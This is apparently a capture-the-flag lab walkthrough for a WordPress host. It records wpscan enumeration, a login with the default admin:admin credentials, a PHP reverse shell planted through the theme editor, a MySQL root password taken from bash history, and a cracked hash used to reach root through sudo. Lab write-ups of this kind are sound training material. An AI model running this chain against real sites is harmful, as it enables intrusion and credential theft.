### Initial Foothold
autorecon 192.168.191.50

port 21 can login anonymously but there are no files to get.
port 22 run nmap brute script. Nothing

Go to `192.168.191.50/robots.txt` showing a wordpress directory. Run wpscan for vulnerable plugins and users. 
```
wpscan --url http://192.168.191.50/wordpress --enumerate ap,u,t --disable-tls-checks
[+] btrisk
[+] admin
wpscan --url https://192.168.191.50/wordpress --plugins-detection aggressive --disable-tls-checks
```
Obtained users: admin, btrisk
Try default credentials admin:admin on wordpress login site. Surprised to get in. Initially wanted to run rockyou.txt with the above users.

Upload zip as plugin but failed. Decide to change the index.php file with a php reverse shell at the below url:
`http://192.168.191.50/wordpress/wp-admin/theme-editor.php?file=index.php&theme=twentyfourteen&scrollto=1020&updated=true`
then open penelope port and head towards
`http://192.168.191.50/wordpress/index.php`

Shell caught.

### Privesc
Conduct basis checks. Realise mysql port is open. Look out for that
Run linpeas.sh

```
/var/www/.bash_history:mysql -uroot -prootpassword!
/var/www/.bash_history:mysql -u root -p -D wordpress -e 'SHOW TABLES;'
/var/www/.bash_history:mysql -u root -p -D wordpress -e 'SELECT * FROM wp_users;'
```

Rerun this. 
```
|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk                   
|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin  
```
Seems like btrisk is also known as root. Crack `a318e4507e5a74604aafb45e4741edd3` at crackstation to obtain `btrisk:roottoor` credential.

switch to `btrisk` and we can get root easily as he has all sudo privileges.
```
www-data@lab-pg-20-ubuntu16-btrsys-240-141:/home$ su btrisk
Password: roottoor
btrisk@lab-pg-20-ubuntu16-btrsys-240-141:/home$ sudo -l
sudo: unable to resolve host lab-pg-20-ubuntu16-btrsys-240-141
[sudo] password for btrisk: roottoor
User btrisk may run the following commands on lab-pg-20-ubuntu16-btrsys-240-141:
    (ALL : ALL) ALL
    (ALL : ALL) ALL
btrisk@lab-pg-20-ubuntu16-btrsys-240-141:/home$ cd /root
bash: cd: /root: Permission denied
btrisk@lab-pg-20-ubuntu16-btrsys-240-141:/home$ sudo -i
sudo: unable to resolve host lab-pg-20-ubuntu16-btrsys-240-141
root@lab-pg-20-ubuntu16-btrsys-240-141:~# cd /root
root@lab-pg-20-ubuntu16-btrsys-240-141:~# cat proof.txt
```